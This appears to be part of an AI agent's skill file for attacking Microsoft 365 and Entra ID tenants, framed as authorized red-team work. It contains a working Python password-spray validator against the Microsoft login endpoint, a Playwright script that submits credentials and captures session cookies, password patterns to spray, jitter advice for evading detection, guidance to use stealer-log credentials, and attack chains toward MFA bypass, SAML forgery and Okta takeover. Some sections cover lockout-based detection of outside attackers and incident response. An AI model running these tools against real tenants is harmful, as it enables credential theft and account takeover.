# m365-entra-attack — 全文续篇

> 主卡保留前 6 节；本文件从第 7 节起。原文件：`/root/.hermes/skills/security/m365-entra-attack/SKILL.md`

## ROPC password validation (the canonical test)

**Single-attempt validator pattern (Python):**

```python
import urllib.request, urllib.parse, ssl, time, json, os
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
ATTEMPT_FILE = "engagement_log/o365_attempts.json"
HARD_CAP = 1  # or 2 — never higher

def attempt(email, password):
    state = json.load(open(ATTEMPT_FILE)) if os.path.exists(ATTEMPT_FILE) else {}
    if state.get(email.lower(), 0) >= HARD_CAP:
        return {"status": "SKIPPED_CAP"}
    body = urllib.parse.urlencode({
        "resource": "https://graph.windows.net",
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # Microsoft Graph PowerShell
        "client_info": "1",
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "openid",
    }).encode()
    state[email.lower()] = state.get(email.lower(), 0) + 1
    json.dump(state, open(ATTEMPT_FILE+".tmp", "w"))
    os.replace(ATTEMPT_FILE+".tmp", ATTEMPT_FILE)  # atomic
    req = urllib.request.Request(
        "https://login.microsoftonline.com/common/oauth2/token",
        data=body, method="POST",
    )
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        r = urllib.request.urlopen(req, context=ctx, timeout=15)
        body = json.loads(r.read())
        # PARSE AS JSON — see CRITICAL TRAP below about substring matching
        if "access_token" in body:    # ← JSON key check, NOT substring
            return {"status": "VALID", "body": body}
        return {"status": "STATUS_200_NO_TOKEN", "body": body}
    except urllib.error.HTTPError as e:
        msg = e.read().decode(errors="ignore")
        for code, status in [
            ("AADSTS50034", "INVALID_USER"),
            ("AADSTS50126", "INVALID_PW"),
            ("AADSTS50053", "LOCKED"),
            ("AADSTS53003", "VALID_CA_BLOCK"),
            ("AADSTS50076", "VALID_MFA"),
            ("AADSTS50079", "VALID_MFA"),
        ]:
            if code in msg:
                return {"status": status, "code": code}
        return {"status": "OTHER", "msg": msg[:200]}
```

### ⚠ CRITICAL TRAP — AADSTS50076 body contains literal `"access_token"` substring

When CA policy requires MFA and ROPC cannot satisfy it, Entra returns an error body that INCLUDES a `claims` field listing CA policy IDs as a step-up challenge:

```json
{
  "error": "invalid_grant",
  "error_description": "AADSTS50076: ...you must use multi-factor authentication...",
  "error_codes": [50076],
  "suberror": "basic_action",
  "claims": "{\"access_token\":{\"capolids\":{\"essential\":true,\"values\":[\"<policy-id-1>\",\"<policy-id-2>\"]}}}"
}
```

**The `"access_token"` substring appears inside the CA claims challenge JSON.** A loose substring check `if "access_token" in raw_body:` will false-positive every MFA-blocked attempt as a successful token issuance.

**Always parse JSON, then check `if "access_token" in parsed_dict:`** — never substring-match on OAuth error bodies. This was discovered in the 2026-05-17 authorized-engagement revalidation where a substring check produced 7 false-positive "CA bypasses" on Sway/Yammer/Bookings/Tunnel client_ids that were actually all enforcing MFA correctly.

The `claims.access_token.capolids` values are tenant-internal Conditional Access policy IDs — useful recon enrichment, but NOT a token. Document them in engagement notes as "CA policy IDs that fired" — they're a defender-side breadcrumb, not an attacker-side win.

**Pace:**
- Per-IP: ≤30 req/sec is fine; Microsoft tolerates well
- Per-user: hard cap from state file is the only thing that matters
- Random jitter (1-5s between attempts) for less-machine-like signature

---

## SAML SSO browser flow (for definitive cred validation when CA blocks ROPC)

When ROPC returns AADSTS53003, you've proven the password. To prove it across BOTH auth paths (and capture Microsoft's CA-block page as evidence), walk SAML SSO via Playwright:

```python
import asyncio
from playwright.async_api import async_playwright

async def saml_validate(target_sp_url, username, password, screenshot_dir):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--ignore-certificate-errors"])
        context = await browser.new_context(ignore_https_errors=True)
        page = await context.new_page()
        # Step 1: navigate to SP
        await page.goto(target_sp_url, wait_until="networkidle", timeout=30000)
        # Step 2: click sign-in (selectors vary per SP)
        for sel in ["button:has-text('Sign in')", "a:has-text('Login')", "button:has-text('Azure')"]:
            try:
                await page.locator(sel).first.click(timeout=3000)
                break
            except: continue
        await page.wait_for_load_state("networkidle", timeout=20000)
        # Step 3: submit username at Microsoft
        await page.locator('input[name="loginfmt"], input[type="email"]').first.fill(username)
        await page.locator('input[type="submit"], #idSIButton9').first.click()
        await page.wait_for_load_state("networkidle", timeout=20000)
        # Step 4: submit password
        await page.locator('input[name="passwd"], input[type="password"]').first.fill(password)
        await page.locator('input[type="submit"], #idSIButton9').first.click()
        await page.wait_for_load_state("networkidle", timeout=30000)
        # Step 5: capture
        await page.screenshot(path=f"{screenshot_dir}/saml_final.png", full_page=True)
        content = await page.content()
        cookies = await context.cookies()
        await browser.close()
        # Check outcome
        low = content.lower()
        if "convergedconditionalaccess" in low or "53003" in low:
            return "CA_BLOCKED"  # cred valid, CA wall
        elif "verify your identity" in low or "approve sign in" in low:
            return "MFA_REQUIRED"  # cred valid, MFA wall
        elif "we couldn't sign you in" in low or "wrong" in low:
            return "INVALID"
        elif "<post-auth-landing-marker>" in low or "dashboard" in low:
            return "FULL_SUCCESS"  # session obtained (replace marker per target app)
        return "UNCLEAR"
```

Microsoft's `ConvergedConditionalAccess` page (PageID in source) is the definitive evidence of CA-block.

---

## Active-attacker detection via lockout differential

If you see `AADSTS50053` (LOCKED) on multiple users despite your 1-attempt-per-user cap:
1. **You did not cause these locks** (math: 1 < 10).
2. **An external attacker is actively spraying the tenant.**
3. **Cluster the locked users alphabetically — if they cluster, attacker is using a sorted username list.**
4. **Diff lockout count between spray-start and spray-end** — new locks during your session = attacker is active *right now*.
5. **Document the locked email list as a finding** (SOC actionable — they pull sign-in logs for those users).

This is the **highest-impact byproduct** of any M365 spray engagement. Always track and report.

---

## Common password patterns to spray (multi-brand enterprise targets)

- `<BrandName>@<Year>` — `<Brand>@2026`, `Tata@2026`
- `<BrandName>@123` — `<Brand>@123` (very common)
- `<PlantCity>@<Year>` — `<City1>@2026`, `<City2>@2026` (production plant cities)
- `<EmployeeID-as-password>` — common in legacy apps (PAN number, employee code, phone last4)
- `Password@<year>`, `Welcome@<year>`, `Admin@<year>` — generic defaults
- `<BrandName>@<Y2-digits>` — `<Brand>@26`

**Engagement caveat:** when client provides leaked-cred dumps (stealer logs), use those FIRST. Each leaked cred is 1 cap-attempt against the strongest known guess for that user.

---

## Engagement journaling (mandatory)

Every M365 attempt logs to JSONL:
```json
{"ts":"2026-05-08T14:40:53","email":"user1@<client>.example","pw_first4":"<r4>","status":"VALID_CA_BLOCK","code":"AADSTS53003","attempts_used":1}
```

**Per-user tracker** (atomic):
```json
{"user1@<client>.example": 1, "user2@<client>.example": 1, ...}
```

**IP rotation log** (per-day):
```
2026-05-08	<src-ip>	<ISP-AS>	<operator-handle>	Round 2 spray
```

These three artifacts are deliverable evidence for the report. They survive into the next engagement as state.

---

## Real-world findings template (from authorized-engagement)

For the report:

**Finding: 261 Entra accounts in pre-existing lockout state**
- Subject: Active external password-spray campaign detected
- Evidence: `o365_results.jsonl` filtered to `status=LOCKED`
- Math: 1-attempt-per-user × 261 LOCKED ≠ our doing
- SOC action: pull sign-in logs for these 261 accounts over last 30-60 days

**Finding: Valid M365 cred — `<user>:<password>` (CA-blocked)**
- Subject: Confirmed valid credential
- Evidence: ROPC AADSTS53003 + SAML SSO `ConvergedConditionalAccess` page screenshot
- Microsoft documentation excerpt: "AADSTS53003 returned only after password validation"
- Recommendation: force password reset, audit org-wide for similar pattern

---

## Anti-patterns (don't do these)

- **DON'T use the leaked cred for the user across multiple resources** — burns the cap with no marginal benefit when CA blocks all paths
- **DON'T retry after AADSTS50053** — account is locked, you'll just see lockout again
- **DON'T spray more than ~30 attempts/sec to login.microsoftonline.com** — Microsoft can flag the IP for sustained credential-stuffing pattern
- **DON'T forget to test ALL Entra tenants** — sister domains often have separate tenants with different password policies
- **DON'T retract a CA-block finding** — AADSTS53003 means the password is correct; that's the whole point

---

## Tooling

```bash
pip install --break-system-packages msftrecon o365spray  # may need to clone msftrecon from GitHub
brew install pandoc                                       # for report generation
go install -v github.com/projectdiscovery/...             # PD command-line toolkit for general recon
```

Pre-built `m365_validator.py` template at engagement working directory `engagement_log/m365_validator.py`. Adapt the `attempt()` function to your engagement.

---

## Verification

1. **Entra ID endpoint probe** — confirm well-known endpoints:
   ```bash
   curl --max-time 30 --connect-timeout 10 -s "https://login.microsoftonline.com/common/.well-known/openid-configuration" | grep -q "token_endpoint" && echo "PASS" || echo "FAIL"
   ```
2. **Tenant discovery** — confirm tenant resolution:
   ```bash
   curl --max-time 30 --connect-timeout 10 -s "https://login.microsoftonline.com/example.com/.well-known/openid-configuration" -o /dev/null -w "HTTP %{http_code}" && echo " PASS" || echo " FAIL"
   ```
All tests verify M365/Entra readiness.

---

## Pitfalls
- **Credential spray without lockout awareness** — Entra ID has Smart Lockout. Spraying without understanding lockout thresholds triggers account locks and alarms.
- **Device code flow phishing** — the user must enter a code at `microsoft.com/devicelogin`. Without demonstrated victim interaction, this is theoretical.
- **Managed vs Federated domain confusion** — managed domains authenticate against Entra ID directly; federated domains go to on-prem ADFS. Different attack surfaces.
- **Guest user enumeration** — B2B guest inviter permissions can enumerate external users. Test the specific guest inviter role, not just any authenticated user.
- **OAuth app consent phishing (illicit consent grant)** — user must click "Accept" on the consent screen. Without demonstrated consent, this is theoretical.
- **Conditional Access bypass** — if the policy requires MFA, test if the MFA prompt can be bypassed via legacy auth, app passwords, or device-based exceptions.


---

## Related Skills & Chains

- **`hunt-mfa-bypass`** — AADSTS50053 (lockout) vs AADSTS50126 (bad password) vs AADSTS50076 (MFA required) is a free factor-presence oracle. Chain primitive: M365 AADSTS50053 lockout differential observed → user has MFA but no CA enforcement on legacy auth → `hunt-mfa-bypass` factor-probe (SMS fallback, voice fallback, OAuth device-code flow, ROPC against legacy endpoint) → Conditional Access bypass via legacy-protocol path.
- **`hunt-ntlm-info`** — On-prem NTLM topology leak feeds the Entra spray. Chain primitive: SharePoint/Exchange/IIS anon NTLM Type-2 → AV_PAIR decode yields `corp.example.com` → `m365-entra-attack` resolves Entra tenant via openid-configuration → ROPC spray with realistic UPN format.
- **`okta-attack`** — Hybrid orgs run Okta-as-IdP federated into Entra. Chain primitive: M365 `getuserrealm` returns `NameSpaceType: Federated` with AuthURL pointing to `*.okta.com` → pivot to `okta-attack` for tenant enumeration → Okta ATO → SAML assertion to Entra → full M365 access.
- **`hunt-saml`** — Federated tenants accept signed SAML assertions; XSW or signature-stripping on the federated IdP bypasses Entra's controls entirely. Chain primitive: `getuserrealm` reveals federation → IdP fingerprinted (ADFS / Okta / PingFederate) → `hunt-saml` XSW1-XSW8 against IdP's `/adfs/ls/` or equivalent → forged assertion → Entra grants access.
- **`redteam-report-template`** — M365 findings need clear tenant/user/CA-policy framing because the blast radius is "every Microsoft service the org uses." Chain primitive: validated finding from this skill → run through `triage-validation` 7-Question Gate → package via `redteam-report-template` with explicit blast-radius (which apps, which users, which data) for client deliverable.
- **`password-spray-methodology`** — Universal password spray pipeline across all protocols + error code differentials

<!-- abraxas-2026-10 -->

## 2026-10 ConnectWise Cloud Backup（原 SkyKick）凭证滥用
供应商凭证被用于登录客户租户。排查：Entra 登录日志筛该 app ID + 异常 IP，重点看 service principal / 非交互式 / 跨租户登录。处置：禁用该企业应用授权，条件访问加限制，轮换同意授权。

